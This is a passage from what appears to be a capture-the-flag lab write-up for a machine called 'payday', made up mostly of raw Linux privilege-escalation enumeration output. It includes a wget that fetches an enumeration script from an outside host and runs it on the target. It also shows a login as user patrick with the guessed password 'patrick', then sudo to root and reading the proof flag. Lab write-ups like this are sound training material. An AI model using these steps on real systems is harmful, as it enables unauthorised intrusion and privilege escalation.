-rwxr-sr-x 1 root crontab 26832 Dec 20  2006 /usr/bin/crontab
-rwxr-sr-x 1 root mail 7732 Sep 21  2007 /usr/bin/mutt_dotlock


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 2803 Apr 24  2008 /etc/adduser.conf
-rw-r--r-- 1 root root 354 Mar  5  2007 /etc/fdmount.conf
-rw-r--r-- 1 root root 73 Apr 24  2008 /etc/inetd.conf
-rw-r--r-- 1 root root 1614 Sep 17  2007 /etc/syslog.conf
-rw-r--r-- 1 root root 1260 May  5  2007 /etc/ucf.conf
-rw-r--r-- 1 root root 342 Apr 24  2008 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 552 Oct  1  2007 /etc/pam.conf
-rw-r--r-- 1 root root 600 Jul 10  2007 /etc/deluser.conf
-rw-r--r-- 1 root root 330 Sep  6  2007 /etc/mke2fs.conf
-rw-r--r-- 1 root root 2349 Sep 30  2007 /etc/gai.conf
-rw-r--r-- 1 root root 26 Jan 22 23:39 /etc/resolv.conf
-rw-r--r-- 1 root root 240 Apr 24  2008 /etc/kernel-img.conf
-rw-r--r-- 1 root root 883 Jul 31  2007 /etc/sysctl.conf
-rw-r--r-- 1 root root 475 Aug 28  2006 /etc/nsswitch.conf
-rw-r--r-- 1 root root 1044 Oct  3  2007 /etc/updatedb.conf
-rw-r--r-- 1 root root 10814 Feb 20  2006 /etc/ltrace.conf
-rw-r----- 1 root fuse 216 Sep 18  2007 /etc/fuse.conf
-rw-r--r-- 1 root root 34 Apr 24  2008 /etc/ld.so.conf
-rw-r--r-- 1 root root 92 May 15  2007 /etc/host.conf
-rw-r--r-- 1 root root 4793 Jun 14  2007 /etc/hdparm.conf
-rw-r--r-- 1 root root 599 Jun 19  2006 /etc/logrotate.conf
-rw-r--r-- 1 root root 2673 Oct  1  2007 /etc/debconf.conf


[+] Root's history files are accessible!
-rw------- 1 root root 0 Sep  3  2020 /root/.bash_history


[-] Location and contents (if accessible) of .bash_history file(s):
/home/patrick/.bash_history


[-] Location and Permissions (if accessible) of .bak file(s):
-rw------- 1 root root 1118 Apr 12  2016 /var/backups/passwd.bak
-rw------- 1 root shadow 629 Apr 12  2016 /var/backups/gshadow.bak
-rw------- 1 root root 754 Apr 12  2016 /var/backups/group.bak
-rw-r--r-- 1 root root 1833 Apr 24  2008 /var/backups/infodir.bak
-rw------- 1 root shadow 761 Apr 12  2016 /var/backups/shadow.bak
-rw-r--r-- 1 patrick patrick 25227 Jul 27  2015 /var/www/include/admin/statistics.php.bak
-rw-r--r-- 1 root root 43021 Apr 24  2008 /etc/dovecot/dovecot.conf.bak
-rw-r--r-- 1 root root 7091185 Jan 17  2018 /boot/initrd.img-2.6.22-14-server.bak


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Apr 24  2008 .
drwxr-xr-x 14 root root 4096 Apr 24  2008 ..


### SCAN COMPLETE ####################################
www-data@payday:/tmp$ wget 192.168.49.70/lse.sh
wget 192.168.49.70/lse.sh
--01:52:53--  http://192.168.49.70/lse.sh
           => `lse.sh'
Connecting to 192.168.49.70:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43,570 (43K) [text/x-sh]

100%[====================================>] 43,570        89.57K/s             

01:52:54 (89.38 KB/s) - `lse.sh' saved [43570/43570]

www-data@payday:/tmp$ chmod +x lse.sh
chmod +x lse.sh
www-data@payday:/tmp$ ./lse.sh
./lse.sh
\e[90m---
\e[97mIf you know the current user password, write it here to check sudo privileges: \e[0;0m

\e[90m---

\e[96m LSE Version:\e[0;0m 3.7

\e[94m        User:\e[0;0m www-data
\e[94m     User ID:\e[0;0m 33
\e[94m    Password:\e[0;0m \e[90mnone\e[0;0m
\e[94m        Home:\e[0;0m /var/www
\e[94m        Path:\e[0;0m /usr/local/bin:/usr/bin:/bin
\e[94m       umask:\e[0;0m 0022

\e[94m    Hostname:\e[0;0m payday
\e[94m       Linux:\e[0;0m 2.6.22-14-server
\e[94mDistribution:\e[0;0m Ubuntu 7.10
\e[94mArchitecture:\e[0;0m i686

\e[35m==================================================================(\e[32m users \e[35m)=====\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90musr000\e[97m Current user groups\e[90m.............................................\e[34m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90musr010\e[97m Is current user in an administrative group?\e[90m..................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90musr020\e[97m Are there other users in administrative groups?\e[90m.................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90musr030\e[97m Other users with shell\e[90m..........................................\e[36m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90musr040\e[97m Environment information\e[90m......................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90musr050\e[97m Groups for other users\e[90m.......................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90musr060\e[97m Other users\e[90m..................................................... \e[90mskip
\e[97m[\e[93m*\e[97m] \e[90musr070\e[97m PATH variables defined inside /etc\e[90m..............................\e[36m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90musr080\e[97m Is '.' in a PATH variable defined inside /etc?\e[90m.................. \e[90mnope\e[0;0m
\e[35m===================================================================(\e[32m sudo \e[35m)=====\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msud000\e[97m Can we sudo without a password?\e[90m.................................\e[92m yes!\e[0;0m
\e[90m---\e[0;0m
usage: sudo [-HPSb] [-p prompt] [-u username|#uid]
            { -e file [...] | -i | -s | <command> }
\e[90m---\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msud040\e[97m Can we read sudoers files?\e[90m...................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msud050\e[97m Do we know if any other users used sudo?\e[90m........................ \e[90mnope\e[0;0m
\e[35m============================================================(\e[32m file system \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst000\e[97m Writable files outside user's home\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst010\e[97m Binaries with setuid bit\e[90m........................................\e[36m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst020\e[97m Uncommon setuid binaries\e[90m........................................\e[92m yes!\e[0;0m
\e[90m---\e[0;0m
/lib/dhcp3-client/call-dhclient-script
/sbin/umount.cifs
/sbin/mount.cifs
/bin/check-foreground-console
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/apache2/suexec
/usr/bin/smbmnt
/usr/bin/smbumount
/tmp/bak
\e[90m---\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst030\e[97m Can we write to any setuid binary?\e[90m..............................\e[92m yes!\e[0;0m
\e[90m---\e[0;0m
/tmp/bak
\e[90m---\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst040\e[97m Binaries with setgid bit\e[90m........................................ \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90mfst050\e[97m Uncommon setgid binaries\e[90m........................................ \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90mfst060\e[97m Can we write to any setgid binary?\e[90m.............................. \e[90mskip
\e[97m[\e[93m*\e[97m] \e[90mfst070\e[97m Can we read /root?\e[90m..............................................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst080\e[97m Can we read subdirectories under /home?\e[90m.........................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst090\e[97m SSH files in home directories\e[90m...................................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst100\e[97m Useful binaries\e[90m.................................................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst110\e[97m Other interesting files in home directories\e[90m..................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst120\e[97m Are there any credentials in fstab/mtab?\e[90m........................ \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst130\e[97m Does 'www-data' have mail?\e[90m...................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst140\e[97m Can we access other users mail?\e[90m................................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst150\e[97m Looking for GIT/SVN repositories\e[90m................................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst160\e[97m Can we write to critical files?\e[90m................................. \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90mfst170\e[97m Can we write to critical directories?\e[90m........................... \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90mfst180\e[97m Can we write to directories from PATH defined in /etc?\e[90m.......... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst190\e[97m Can we read any backup?\e[90m......................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst200\e[97m Are there possible credentials in any shell history file?\e[90m....... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst210\e[97m Are there NFS exports with 'no_root_squash' option?\e[90m............. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst220\e[97m Are there NFS exports with 'no_all_squash' option?\e[90m.............. \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mfst500\e[97m Files owned by user 'www-data'\e[90m.................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mfst510\e[97m SSH files anywhere\e[90m.............................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mfst520\e[97m Check hosts.equiv file and its contents\e[90m......................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mfst530\e[97m List NFS server shares\e[90m.......................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mfst540\e[97m Dump fstab file\e[90m................................................. \e[90mskip
\e[35m=================================================================(\e[32m system \e[35m)=====\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msys000\e[97m Who is logged in\e[90m................................................ \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msys010\e[97m Last logged in users\e[90m............................................ \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90msys020\e[97m Does the /etc/passwd have hashes?\e[90m............................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msys022\e[97m Does the /etc/group have hashes?\e[90m................................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msys030\e[97m Can we read shadow files?\e[90m....................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msys040\e[97m Check for other superuser accounts\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msys050\e[97m Can root user log in via SSH?\e[90m...................................\e[36m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msys060\e[97m List available shells\e[90m........................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msys070\e[97m System umask in /etc/login.defs\e[90m................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msys080\e[97m System password policies in /etc/login.defs\e[90m..................... \e[90mskip
\e[35m===============================================================(\e[32m security \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msec000\e[97m Is SELinux present?\e[90m............................................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msec010\e[97m List files with capabilities\e[90m.................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msec020\e[97m Can we write to a binary with caps?\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msec030\e[97m Do we have all caps in any binary?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msec040\e[97m Users with associated capabilities\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msec050\e[97m Does current user have capabilities?\e[90m............................ \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90msec060\e[97m Can we read the auditd log?\e[90m..................................... \e[90mnope\e[0;0m
\e[35m========================================================(\e[32m recurrent tasks \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret000\e[97m User crontab\e[90m.................................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mret010\e[97m Cron tasks writable by user\e[90m..................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret020\e[97m Cron jobs\e[90m.......................................................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret030\e[97m Can we read user crontabs\e[90m....................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret040\e[97m Can we list other user cron tasks?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret050\e[97m Can we write to any paths present in cron jobs\e[90m..................\e[36m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mret060\e[97m Can we write to executable paths present in cron jobs\e[90m...........\e[92m yes!\e[0;0m
\e[90m---\e[0;0m
/etc/cron.d/php5:09,39 *     * * *     root   [ -d /var/lib/php5 ] && find /var/lib/php5/ -type f -cmin +$(/usr/lib/php5/maxlifetime) -print0 | xargs -r -0 rm
/etc/cron.d/php5:09,39 *     * * *     root   [ -d /var/lib/php5 ] && find /var/lib/php5/ -type f -cmin +$(/usr/lib/php5/maxlifetime) -print0 | xargs -r -0 rm
\e[90m---\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mret400\e[97m Cron files\e[90m...................................................... \e[90mskip
\e[97m[\e[93m*\e[97m] \e[90mret500\e[97m User systemd timers\e[90m............................................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mret510\e[97m Can we write in any system timer?\e[90m............................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mret900\e[97m Systemd timers\e[90m.................................................. \e[90mskip
\e[35m================================================================(\e[32m network \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mnet000\e[97m Services listening only on localhost\e[90m............................\e[36m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mnet010\e[97m Can we sniff traffic with tcpdump?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mnet500\e[97m NIC and IP information\e[90m.......................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet510\e[97m Routing table\e[90m................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet520\e[97m ARP table\e[90m....................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet530\e[97m Nameservers\e[90m..................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet540\e[97m Systemd Nameservers\e[90m............................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet550\e[97m Listening TCP\e[90m................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet560\e[97m Listening UDP\e[90m................................................... \e[90mskip
\e[35m===============================================================(\e[32m services \e[35m)=====\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msrv000\e[97m Can we write in service files?\e[90m.................................. \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90msrv010\e[97m Can we write in binaries executed by services?\e[90m.................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv020\e[97m Files in /etc/init.d/ not belonging to root\e[90m..................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv030\e[97m Files in /etc/rc.d/init.d not belonging to root\e[90m................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv040\e[97m Upstart files not belonging to root\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv050\e[97m Files in /usr/local/etc/rc.d not belonging to root\e[90m.............. \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msrv400\e[97m Contents of /etc/inetd.conf\e[90m..................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv410\e[97m Contents of /etc/xinetd.conf\e[90m.................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv420\e[97m List /etc/xinetd.d if used\e[90m...................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv430\e[97m List /etc/init.d/ permissions\e[90m................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv440\e[97m List /etc/rc.d/init.d permissions\e[90m............................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv450\e[97m List /usr/local/etc/rc.d permissions\e[90m............................ \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv460\e[97m List /etc/init/ permissions\e[90m..................................... \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90msrv500\e[97m Can we write in systemd service files?\e[90m.......................... \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90msrv510\e[97m Can we write in binaries executed by systemd services?\e[90m.......... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv520\e[97m Systemd files not belonging to root\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msrv900\e[97m Systemd config files permissions\e[90m................................ \e[90mskip
\e[35m===============================================================(\e[32m software \e[35m)=====\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof000\e[97m Can we connect to MySQL with root/root credentials?\e[90m.............\e[92m yes!\e[0;0m
\e[90m---\e[0;0m
mysqladmin  Ver 8.41 Distrib 5.0.45, for pc-linux-gnu on i486
Copyright (C) 2000-2006 MySQL AB
This software comes with ABSOLUTELY NO WARRANTY. This is free software,
and you are welcome to modify and redistribute it under the GPL license

Server version          5.0.45-Debian_1ubuntu3-log
Protocol version        10
Connection              Localhost via UNIX socket
UNIX socket             /var/run/mysqld/mysqld.sock
Uptime:                 180 days 17 hours 5 min 7 sec

Threads: 1  Questions: 53884  Slow queries: 0  Opens: 315  Flush tables: 1  Open tables: 64  Queries per second avg: 0.003
\e[90m---\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof010\e[97m Can we connect to MySQL as root without password?\e[90m............... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof015\e[97m Are there credentials in mysql_history file?\e[90m.................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof020\e[97m Can we connect to PostgreSQL template0 as postgres and no pass?\e[90m. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof020\e[97m Can we connect to PostgreSQL template1 as postgres and no pass?\e[90m. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof020\e[97m Can we connect to PostgreSQL template0 as psql and no pass?\e[90m..... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof020\e[97m Can we connect to PostgreSQL template1 as psql and no pass?\e[90m..... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msof030\e[97m Installed apache modules\e[90m........................................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof040\e[97m Found any .htpasswd files?\e[90m...................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof050\e[97m Are there private keys in ssh-agent?\e[90m............................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof060\e[97m Are there gpg keys cached in gpg-agent?\e[90m......................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof070\e[97m Can we write to a ssh-agent socket?\e[90m............................. \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90msof080\e[97m Can we write to a gpg-agent socket?\e[90m............................. \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90msof090\e[97m Found any keepass database files?\e[90m............................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof100\e[97m Found any 'pass' store directories?\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof110\e[97m Are there any tmux sessions available?\e[90m.......................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msof120\e[97m Are there any tmux sessions from other users?\e[90m................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof130\e[97m Can we write to tmux session sockets from other users?\e[90m.......... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof140\e[97m Are any screen sessions available?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msof150\e[97m Are there any screen sessions from other users?\e[90m................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof160\e[97m Can we write to screen session sockets from other users?\e[90m........ \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msof500\e[97m Sudo version\e[90m.................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof510\e[97m MySQL version\e[90m................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof520\e[97m Postgres version\e[90m................................................ \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof530\e[97m Apache version\e[90m.................................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof540\e[97m Tmux version\e[90m.................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof550\e[97m Screen version\e[90m.................................................. \e[90mskip
\e[35m=============================================================(\e[32m containers \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mctn000\e[97m Are we in a docker container?\e[90m................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mctn010\e[97m Is docker available?\e[90m............................................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mctn020\e[97m Is the user a member of the 'docker' group?\e[90m..................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mctn200\e[97m Are we in a lxc container?\e[90m...................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mctn210\e[97m Is the user a member of any lxc/lxd group?\e[90m...................... \e[90mnope\e[0;0m
\e[35m==============================================================(\e[32m processes \e[35m)=====\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mpro000\e[97m Waiting for the process monitor to finish\e[90m.......................\e[34m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mpro001\e[97m Retrieving process binaries\e[90m.....................................\e[34m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mpro002\e[97m Retrieving process users\e[90m........................................\e[34m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mpro010\e[97m Can we write in any process binary?\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mpro020\e[97m Processes running with root permissions\e[90m.........................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mpro030\e[97m Processes running by non-root users with shell\e[90m..................\e[36m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mpro500\e[97m Running processes\e[90m............................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mpro510\e[97m Running process binaries and permissions\e[90m........................ \e[90mskip

\e[35m==================================(\e[32m FINISHED \e[35m)==================================\e[0;0m
www-data@payday:/tmp$ 
```

## SSH into patrick lmao

```
www-data@payday:/var/www/skins$ su patrick
su patrick
Password: patrick

patrick@payday:/var/www/skins$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for patrick:patrick

User patrick may run the following commands on this host:
    (ALL) ALL
patrick@payday:/var/www/skins$ sudo su
sudo su
root@payday:/var/www/skins# cd /root
cd /root
root@payday:~# cat proof.txt
cat proof.txt
89c91442b6fbc440153cb0cef8656082
root@payday:~# ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:BA:FA:AE  
          inet addr:192.168.70.39  Bcast:192.168.70.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feba:faae/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:533331 errors:27 dropped:27 overruns:0 frame:0
          TX packets:524404 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:74272486 (70.8 MB)  TX bytes:243857513 (232.5 MB)
          Interrupt:17 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:498 errors:0 dropped:0 overruns:0 frame:0
          TX packets:498 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1248045 (1.1 MB)  TX bytes:1248045 (1.1 MB)

root@payday:~# 
```

![](Pasted%20image%2020220123151703.png)

![](Pasted%20image%2020220123153653.png)

# Others
